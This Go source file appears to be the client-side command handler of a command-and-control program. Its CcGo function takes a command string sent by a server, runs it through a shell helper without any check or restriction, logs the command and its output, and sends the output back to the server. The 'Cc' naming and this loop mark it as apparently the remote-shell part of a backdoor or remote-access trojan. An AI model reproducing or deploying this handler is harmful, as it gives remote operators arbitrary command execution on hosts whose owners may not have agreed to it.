package service

import (
	"github.com/titan/tingchao/model"
	"github.com/titan/tingchao/utils"
	"log"
)

func CcGo(msg *model.MessageModel) {
	if msg.Data == nil { // 判断一下防止客户端崩溃
		log.Println("[service.CcRun]msg.Data对象为nil,直接返回")
		return
	}

	if _, ok := msg.Data.(*model.CcCmdModel); !ok {
		log.Print("[service.CcRun]类型转换错误")
		return
	}
	cm := msg.Data.(*model.CcCmdModel)

	//开始执行命令
	if len(cm.Cmd) > 0 {
		shellOut, err := utils.ExecShell(cm.Cmd)
		if err != nil {
			log.Println("[service.CcRun]执行命令失败！", err)
			shellOut = "[service.CcRun]命令执行失败"
		}
		log.Println(cm.Cmd)
		log.Println(shellOut)
		cm.ReturnStr = shellOut
	}

	pm := model.NewPackageModel()
	pm.AddMsg(model.MsgCC, cm)
	pData, err := pm.EncodePackage()
	if err != nil {
		log.Println("[service.CcRun]发送消息失败")
		return
	}
	Submit2Server(*pData)
}
